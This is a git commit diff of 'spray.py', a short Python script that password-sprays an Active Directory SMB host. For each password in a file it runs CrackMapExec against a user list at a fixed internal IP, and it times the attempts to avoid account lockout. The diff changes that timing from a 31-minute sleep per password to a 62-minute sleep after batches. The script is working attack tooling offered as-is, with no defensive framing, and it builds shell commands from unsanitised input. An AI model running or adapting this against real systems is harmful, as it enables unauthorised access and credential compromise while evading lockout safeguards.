5438d0bc375d04b3fae64e1d21bf1bbeaa1e6e44
AndyFeiLi <59521017+AndyFeiLi@users.noreply.github.com>
2022-02-18 09:29:15 +0800

    Update spray.py

--- spray.py
+++ spray.py
@@ -1,17 +1,15 @@
-#password spray AD every 31 minutes to avoid account lockout
-
 import os
 import time
+
+i = 1
 
 with open('password.txt') as f:
  for line in f:
   print("===================================================================================================")	
-  print()	
-  print()
   print("testing with password: "+ line)
-  os.system('cme smb 172.18.1.116 -u users.txt --continue-on-success -p ' +line)
-  print()	
-  print("sleeping")	
-  time.sleep(1860) # Sleep for 31 minutes
-  print()	
-
+  os.system('cme smb 172.18.1.116 -u user.txt --continue-on-success -p ' +line)	
+  if (i ==3):
+   i = 0
+   time.sleep(3720) # Sleep for 62 minutes
+  else:
+   i = i + 1	
